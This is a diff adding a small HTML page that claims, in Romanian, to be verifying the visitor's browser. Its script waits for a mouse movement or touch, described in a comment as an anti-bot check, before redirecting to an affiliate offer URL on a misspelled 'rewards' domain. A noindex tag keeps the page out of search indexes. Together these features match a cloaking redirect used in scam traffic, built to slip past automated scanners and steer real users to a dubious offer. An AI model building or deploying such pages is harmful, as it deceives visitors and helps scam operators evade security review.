@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Redirecting...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #f5f5f5;
+      color: #333;
+    }
+  </style>
+  <script>
+    // Anti-bot check: waits for user interaction before redirect
+    function humanRedirect() {
+      setTimeout(() => {
+        window.location.href = "https://rewarrdsgiant.com/aff_c?offer_id=2343&aff_id=18811&source=Stimdirect";
+      }, 300); // delay 300ms
+    }
+
+    // Wait for mouse move or touch before redirecting
+    document.addEventListener("DOMContentLoaded", () => {
+      let redirected = false;
+      const go = () => {
+        if (!redirected) {
+          redirected = true;
+          humanRedirect();
+        }
+      };
+      window.addEventListener("mousemove", go, { once: true });
+      window.addEventListener("touchstart", go, { once: true });
+    });
+  </script>
+</head>
+<body>
+  <p>Verificăm browserul tău...</p>
+</body>
+</html>
